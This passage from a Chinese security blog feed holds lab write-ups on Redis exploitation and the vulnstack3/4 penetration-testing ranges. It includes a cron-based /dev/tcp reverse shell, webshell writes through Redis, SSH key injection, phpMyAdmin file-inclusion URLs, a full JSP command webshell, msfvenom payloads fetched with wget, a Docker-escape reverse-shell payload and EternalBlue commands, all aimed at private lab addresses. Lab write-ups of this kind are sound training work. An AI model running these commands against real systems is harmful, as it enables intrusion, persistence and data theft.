<p><img src="/posts/4f399e45/dc_psexec1.png"></p>
<p><img src="/posts/4f399e45/dc_psexec2.png"></p>
<p><img src="/posts/4f399e45/dc_system.png"></p>
<p><img src="/posts/4f399e45/tuopu.png"></p>
<p>run mimikatz 看下dc机器的密码</p>
<p><img src="/posts/4f399e45/dc_passwd.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>redisRCE复现</title>
    <url>/posts/27814dfe/</url>
    <content><![CDATA[<h3 id="redis4-x-5-x-RCE"><a href="#redis4-x-5-x-RCE" class="headerlink" title="redis4.x/5.x RCE"></a>redis4.x/5.x RCE</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>4.x-5.x</p>
<h4 id="主从模式"><a href="#主从模式" class="headerlink" title="主从模式"></a>主从模式</h4><p>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
<h4 id="redis模块"><a href="#redis模块" class="headerlink" title="redis模块"></a>redis模块</h4><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p>
<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 下载redis</span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.0.tar.gz</span><br><span class="line">tar -xvzf redis-5.0.0.tar.gz</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># 更改配置文件</span><br><span class="line">cd redis-5.0.0</span><br><span class="line">vim redis.conf</span><br><span class="line">      protected-mode yes 改为protected-mode no</span><br><span class="line">      bind 127.0.0.1 改为 bind 0.0.0.0</span><br><span class="line"></span><br><span class="line"># 启动redis</span><br><span class="line">cd src</span><br><span class="line">./redis-server ../redis.conf   # 加载指定配置</span><br><span class="line"></span><br><span class="line"># 关闭防火墙</span><br><span class="line">systemctl stop firewalld </span><br></pre></td></tr></table></figure>

<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>exp下载 <code>https://github.com/n0b0dyCN/redis-rogue-server</code></p>
<p>用法:<code>python3 redis-rogue-server.py --rhost=192.168.0.182 --lhost=192.168.0.128 --exp=exp.so</code></p>
<p>-r 反弹shell  -i 实时shell</p>
<p><img src="/posts/27814dfe/exp_i.png"></p>
<p><img src="/posts/27814dfe/exp.png"></p>
<p><img src="/posts/27814dfe/shell.png"></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a></p>
<p><a href="http://www.feidao.site/wordpress/?p=2090">http://www.feidao.site/wordpress/?p=2090</a></p>
<p><a href="https://blog.csdn.net/weixin_43252204/article/details/115181128">https://blog.csdn.net/weixin_43252204/article/details/115181128</a></p>
</blockquote>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>redis未授权访问漏洞复现</title>
    <url>/posts/19a78c2/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（默认为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据，攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作。</p>
<p>影响版本：Redis 2.x，3.x，4.x，5.x。但是在Redis3.2之后增加了<strong>protected-mode</strong>安全模式，默认开启，且绑定了本地IP</p>
<p>所以想要复现需要更改配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bind 127.0.0.1 =&gt; bind 0.0.0.0  //开启远程访问</span><br><span class="line">protected-mode yes =&gt; protested-mode no</span><br></pre></td></tr></table></figure>

<p>为了方便选择使用3.2版本之前的Redis：Redis-2.8.17，不需要修改配置文件即可复现</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>centos7 （192.168.0.182）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 下载redis-2.8.17</span><br><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line"></span><br><span class="line"># 解压压缩包 编译安装</span><br><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">cd redis-2.8.17</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># redis.conf拷贝到/etc下面</span><br><span class="line">cp redis.conf /etc/redis.conf</span><br><span class="line"></span><br><span class="line"># 将redis-server和redis-cli拷贝到/usr/bin目录下，方便直接启动redis服务器</span><br><span class="line">cd src</span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 由于是在本地搭建的，没有开启6379端口对外开放，所有先在centos上先关闭防火墙 </span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line">systemctl disable firewalld.service</span><br><span class="line">systemctl status firewalld.service</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用kali远程连接redis</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.163.132</span><br></pre></td></tr></table></figure>

<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><p>条件</p>
<ul>
<li>成功连接redis服务器</li>
<li>知道web根目录的绝对路径</li>
<li>redis服务器用户有写入权限</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">192.168.0.182:6379&gt; set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="/posts/19a78c2/shell.png"></p>
<h4 id="写入ssh公钥远程连接"><a href="#写入ssh公钥远程连接" class="headerlink" title="写入ssh公钥远程连接"></a>写入ssh公钥远程连接</h4><p>1.kali 本地生成ssh公钥</p>
<p><code>ssh-keygen -t rsa</code></p>
<p>2.进入.ssh目录，将公钥写入1.txt</p>
<p><code>cd /root/.ssh</code></p>
<p><code>(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt</code></p>
<p><img src="/posts/19a78c2/1_txt.png"></p>
<p>3.将1.txt写入靶机</p>
<p><code> cat 1.txt | redis-cli -h 192.168.0.182 -x set crack</code></p>
<p>4.远程登录靶机redis服务</p>
<p><code>redis-cli -h 192.168.0.182</code></p>
<p>5.更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）,设置上传公钥的备份文件名字为authorized_keys，save保存</p>
<p><code>CONFIG GET dir</code></p>
<p><code>config set dir /root/.ssh</code> </p>
<p><code>CONFIG SET dbfilename authorized_keys</code></p>
<p><code>CONFIG GET dbfilename</code> 检查是否有authorized_keys文件</p>
<p><code>save</code></p>
<p><img src="/posts/19a78c2/save_file.png"></p>
<p>6.ssh连接靶机</p>
<p><code>ssh -i id_rsa root@192.168.0.182</code></p>
<p>登录成功</p>
<p><img src="/posts/19a78c2/ssh_conn.png"></p>
<h4 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h4><p>kali使用nc监听端口</p>
<p><code>nc -lvvp 5555</code></p>
<p>kali连接redis服务</p>
<p><code>redis-cli -h 192.168.0.182</code></p>
<p>向服务器写入文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.128/5555 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>查看nc 是否反弹到shell</p>
<p><img src="/posts/19a78c2/nc_shell.png"></p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
<li><p>禁用高危命令，如远程修改 DB 文件地址</p>
</li>
<li><p>选择使用地权限运行redis服务，且禁止远程登录</p>
</li>
<li><p>设置Redis服务密码，或是绑定本地IP：127.0.0.1</p>
</li>
</ul>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="http://www.feidao.site/wordpress/?p=2090">www.feidao.site/wordpress/?p=2090</a></p>
<p><a href="https://www.freebuf.com/vuls/248207.html">https://www.freebuf.com/vuls/248207.html</a></p>
<p><a href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></p>
<p><a href="https://www.yyxzz.net/articles/36.html">https://www.yyxzz.net/articles/36.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack4靶场</title>
    <url>/posts/e94e95f1/</url>
    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">外网使用NAT模式  内网使用VM3 192.168.181.0/24</span><br><span class="line">Ubuntu(ubuntu)      192.168.183.129     192.168.0.180 </span><br><span class="line">DC(Dotest123)       192.168.183.130</span><br><span class="line">Win7(Test2021)      192.168.183.128</span><br></pre></td></tr></table></figure>

<p>开启web机器(ubuntu)的dokcer容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/ubuntu/Desktop/vulhub/struts2/s2-045</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line">sudo docker ps  </span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>sudo nmap 192.168.0.180 -sT -Pn -sV </code></p>
<p><img src="/posts/e94e95f1/namp.png"></p>
<p>开放了 22 2001 2002 2003 端口</p>
<p>分别访问了下2001，2002，2003端口</p>
<p>2001    structs2</p>
<p>2002    tomcat</p>
<p>2003    phpmyadmin4.8.1</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="phpmyadmin-CVE-2018-12613"><a href="#phpmyadmin-CVE-2018-12613" class="headerlink" title="phpmyadmin CVE-2018-12613"></a>phpmyadmin CVE-2018-12613</h4><p>看了下phpmyadmin的版本 是4.8.1 先验证下是否存在cve-2018-12613</p>
<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code> 直接运行了/etc/passwd 说明存在该漏洞</p>
<p><img src="/posts/e94e95f1/phpmyadmin1.png"></p>
<p>然后尝试getshell</p>
<p>在sql处 执行 <code>select &#39;&lt;?php phpinfo();?&gt;&#39;</code></p>
<p><img src="/posts/e94e95f1/phpmyadmin2.png"></p>
<p>执行成功后查看 自己的sessionid  phpmyadmin的值 <code>2c8e2d642e3762699d4e070db30880b6</code></p>
<p><img src="/posts/e94e95f1/phpmyadmin_value.png"></p>
<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_2c8e2d642e3762699d4e070db30880b6</code></p>
<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_7f9c04b6ead4e844459d4ec29658e424</code></p>
<p>成功执行之前在sql处的phpinfo命令</p>
<p><img src="/posts/e94e95f1/phpmyadmin_phpinfo.png"></p>
<p>写入一句话</p>
<p>尝试几个一句话都写入失败了，写入后会报错，可能是因为docker的原因</p>
<p><img src="/posts/e94e95f1/phpmyadmin_shell_error.png"></p>
<h4 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h4><p><img src="/posts/e94e95f1/struts2_1.png"></p>
<p><img src="/posts/e94e95f1/struts2_2.PNG"></p>
<p>可以判断是docker容器</p>
<p>上传jsp shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> %&gt;</span><br><span class="line"> &lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line"> &lt;FORM METHOD=&quot;POST&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;</span><br><span class="line"> &lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;</span><br><span class="line"> &lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;</span><br><span class="line"> &lt;/FORM&gt;</span><br><span class="line"> &lt;pre&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> if (request.getParameter(&quot;cmd&quot;) != null) &#123;</span><br><span class="line">    </span><br><span class="line">         out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&gt;&quot;);</span><br><span class="line">         Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line">         OutputStream os = p.getOutputStream();</span><br><span class="line">         InputStream in = p.getInputStream();</span><br><span class="line">         DataInputStream dis = new DataInputStream(in);</span><br><span class="line">         String disr = dis.readLine();</span><br><span class="line">         while ( disr != null ) &#123;</span><br><span class="line">    </span><br><span class="line">                 out.println(disr); disr = dis.readLine(); &#125;</span><br><span class="line">         &#125;</span><br><span class="line"> %&gt;</span><br><span class="line"> &lt;/pre&gt;</span><br><span class="line"> &lt;/BODY&gt;&lt;/HTML&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/e94e95f1/struts2_shell.png"></p>
<h4 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h4><p>使用kali的searchsploit搜索tomcat的poc，这里tomcat版本是8.5</p>
<p><code>searchsploit tomcat 8.5.19</code></p>
<p><img src="/posts/e94e95f1/searchsploit_tomcat.png"></p>
<p><code>searchsploit -m jsp/webapps/42966.py</code></p>
<p><code>sudo python2 42966.py -u http://192.168.0.180:2002</code></p>
<p><code>sudo python2 42966.pu -u http://192.168.0.180:2002 -p pwn</code></p>
<p>访问<code>http://192.168.0.180:2002/pwn.jsp</code></p>
<p><img src="/posts/e94e95f1/tomcat_shell_whoami.png"></p>
<p>判断是docker环境<code>ls -alh /.dockerenv</code>  <code>cat /proc/1/cgroup</code></p>
<h4 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h4><p>生成msf马</p>
<p><code> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.128 LPORT=4444 -f elf &gt; shell.elf</code></p>
<p>kali开启http服务</p>
<p><code>sudo python3 -mhttp.server 9999</code></p>
<p>在上传的pwn.jsp通过wget下载msf</p>
<p><code>wget http://192.168.0.128:9999/shell.elf</code></p>
<p><code>chmod 777 shell.elf</code></p>
<p><code>./shell.elf</code></p>
<p>msf开启监听</p>
<p><code>use exploit/multi/handler</code></p>
<p><code>set payload  linux/x86/meterpreter/reverse_tcp</code></p>
<p><code>set lhost 192.168.0.128</code></p>
<p><code>set lport 4444</code></p>
<p><code>run</code></p>
<p>成功反弹到shell</p>
<p><img src="/posts/e94e95f1/msf_shell.png"></p>
<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h4 id="利用CVE-2019-5736进行docker逃逸"><a href="#利用CVE-2019-5736进行docker逃逸" class="headerlink" title="利用CVE-2019-5736进行docker逃逸"></a>利用CVE-2019-5736进行docker逃逸</h4><p>payload下载地址 <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
<p>下载并编译main,go 修改payload替换为反弹shell </p>
<p><code>var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.0.128/5555 0&gt;&amp; 1&quot;</code></p>
<p>编译生成go文件</p>
<p><code> CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></p>
<p>通过msf将生成的main.go上传到靶机</p>
<p><code>upload ~/桌面/CVE-2019-5736-PoC /home</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home </span><br><span class="line">chmod /main</span><br><span class="line">cd /main</span><br><span class="line">./main.go</span><br></pre></td></tr></table></figure>

<p>在执行前先在kali上开启监听</p>
<p><code>nc -lvvp 5555</code></p>
<p>但是由于需要宿主机执行命令 才能去触发payload反弹shell</p>
<p>运行完之后 msf进入shell就会卡住…所以就换一种方法 可以使用–privileged（特权模式）进行逃逸</p>
<h4 id="利用–privileged特权模式逃逸"><a href="#利用–privileged特权模式逃逸" class="headerlink" title="利用–privileged特权模式逃逸"></a>利用–privileged特权模式逃逸</h4><p>使用特权模式向宿主机的硬盘中写入ssh私钥，实现ssh免密登录宿主机</p>
<p>1.查看磁盘文件 <code>fdisk -l</code></p>
<p><img src="/posts/e94e95f1/docker_fdisk.png"></p>
<p>2.查看设备文件 <code>ls /dev</code></p>
<p>3.新建目录进行挂载      <code>mkdir /test</code></p>
<p>4.将/dev/sda1挂载到/test目录中  <code>mount /dev/sda1 /test</code></p>
<p>5.查看是否挂载成功 <code>ls /test</code></p>
<p><img src="/posts/e94e95f1/mount_test.png"></p>
<p>6.在kali本地上生成ssh密钥 <code>ssh-keygen -f test</code> ，然后会生成<code>test</code> <code>test.pub</code></p>
<p>赋予600权限<code>chmod 600 test</code></p>
<p>7.将生成的密钥写入到目标机器中</p>
<p>由于前面将 <code>sda1</code>挂载到了<code>/test</code> 所以访问/test/home也就等同于去访问宿主机的/home目录</p>
<p><code>ls /test/home</code></p>
<p><img src="/posts/e94e95f1/ls_test_home.png"></p>
<p>查看所有文件<code>ls -alh /test/home/ubuntu</code></p>
<p><img src="/posts/e94e95f1/ls_test_home_ubuntu.png"></p>
<p>查看.ssh文件 <code>ls -alh /test/home/ubuntu/.ssh/</code></p>
<p><img src="/posts/e94e95f1/ls_test_home_ubuntu_ssh.png"></p>
<p><code>cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</code> # -avx将权限也一起赋予</p>
<p><img src="/posts/e94e95f1/cp_key.png"></p>
<p><code>echo &gt; /test/home/ubuntu/.ssh/authorized_keys</code></p>
<p><code>cat test.pub</code> </p>
<p><code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020</code></p>
<br>

<p><code>echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020&#39; &gt;&gt; /test/home/ubuntu/.ssh/authorized_keys    </code># 将ssh秘钥写入authorized_keys文件</p>
<p><img src="/posts/e94e95f1/echo_ssh_rsa.png"></p>
<p>查看是否写入成功，发现还是没成功，使用<code>echo &gt; /test/home/ubuntu/.ssh/authorized_keys </code>无法清除原有的值，应该是没有写入权限</p>
<p><code> cat /test/home/ubuntu/.ssh/authorized_keys</code></p>
<p><img src="/posts/e94e95f1/cat_ssh_rsa.png"></p>
<p>尝试去上传一个key.sh，内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">echo &gt; /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020&#x27; &gt; /test/home/ubuntu/.ssh/authorized_keys</span><br><span class="line">cat /test/home/ubuntu/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>开启http服务使用靶机下载</p>
<p><code>sudo python3 -m http.server 9999</code></p>
<p><code>wget http://192.168.0.128:9999</code></p>
<p><code>chmod 777 key.sh</code></p>
<p><code>./key.sh</code></p>
<p>还是写入失败了，看了下师傅们也是这样做的没啥问题，然后我就去ubuntu靶机上试了下发现也没法使用echo写入，只能通过<code>sudo vim authorized_keys</code>手动将在kali上生成的密钥复制进去，才能在kali上免密登录</p>
<p><code>ssh -i test ubuntu@192.168.0.181</code></p>
<p><img src="/posts/e94e95f1/ssh_test_ubuntu.png"></p>
<h4 id="上线msf-1"><a href="#上线msf-1" class="headerlink" title="上线msf"></a>上线msf</h4><p>然后在msf生成木马，使用python开启gttp服务，下载后连接shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.128 LPORT=8888 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p><img src="/posts/e94e95f1/msf_shell2.png"></p>
<p><code>use exploit/multi/handler </code></p>
<p> <code>set payload  linux/x86/meterpreter/reverse_tcp</code></p>
<p>突然不小心把shell.elf断掉了 重新上线了一个 session 12</p>
<h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><p><code> use post/multi/manage/autoroute</code></p>
<p><img src="/posts/e94e95f1/autoroute.png"></p>
<p><code>route print</code>查看路由</p>
<p><img src="/posts/e94e95f1/route_print.png"></p>
<h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><p><code>use auxiliary/server/socks_proxy</code></p>
<p><img src="/posts/e94e95f1/set_socks_proxy.png"></p>
<p><code>sudo /etc/proxychains4.conf</code></p>
<p>修改kali proxychains4.conf配置为<code>socks5 127.0.0.1 1080</code> </p>
<br>

<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><p>使用smb扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line">set rhosts 192.168.183.0/24`</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>扫到两台windows机器</p>
<p><img src="/posts/e94e95f1/smb_scan1.png"></p>
<p><img src="/posts/e94e95f1/smb_scan2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.183.130   win2008</span><br><span class="line">192.168.183.148   win7</span><br></pre></td></tr></table></figure>

<p>用ms17-010扫一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set rhosts 192.168.183.130,148</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/posts/e94e95f1/smb_ms17_010.png"></p>
<p>两台机器都存在ms17-010漏洞</p>
<p>使用ms17-010进行攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">setg proxies socks5:127.0.0.1:1080</span><br><span class="line">set rhosts 192.168.183.148</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set lport 4444</span><br><span class="line">set autorunscript post/windows/manage/migrate</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>两台机器都没打通……</p>
<p><img src="/posts/e94e95f1/ms17010_fail.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack3靶场</title>
    <url>/posts/2ce9ab7f/</url>
    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>设置VM2 网段为 192.168.93.0/24 需要重启一些centos的网卡<code>service network restart</code></p>
<blockquote>
<p>web-centos     192.168.3.40（这里的ip经常会变化）        192.168.93.100<br>web-ubuntu    192.168.93.120<br>win2008<br>win2012<br>win7</p>
</blockquote>
<p><img src="/posts/2ce9ab7f/tuopu.png"></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="nmap端口扫描"><a href="#nmap端口扫描" class="headerlink" title="nmap端口扫描"></a>nmap端口扫描</h4><p><code>sudo nmap 192.168.3.40 -sV</code></p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo nmap 192.168.3.40 -sV<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-07-25 16:15 CST<br>Nmap scan report for 192.168.3.40<br>Host is up (0.0082s latency).<br>Not shown: 995 filtered ports<br>PORT     STATE SERVICE    VERSION<br>22/tcp   open  ssh        OpenSSH 5.3 (protocol 2.0)<br>25/tcp   open  tcpwrapped<br>80/tcp   open  http       nginx 1.9.4<br>110/tcp  open  tcpwrapped<br>3306/tcp open  mysql      MySQL 5.7.27-0ubuntu0.16.04.1</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds</p>
</blockquote>
<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>使用dirmap扫描</p>
<p><code>sudo python3 dirmap.py -i 192.168.3.40 -lcf</code></p>
<p><img src="/posts/2ce9ab7f/dirmap_output.png"></p>
<p>使用dirsearch扫描</p>
<p><code>sudo python3  dirsearch.py -u http://192.168.3.40 -e */</code></p>
<p><img src="/posts/2ce9ab7f/dirsearch_output.png"></p>
<p>得到几个敏感目录</p>
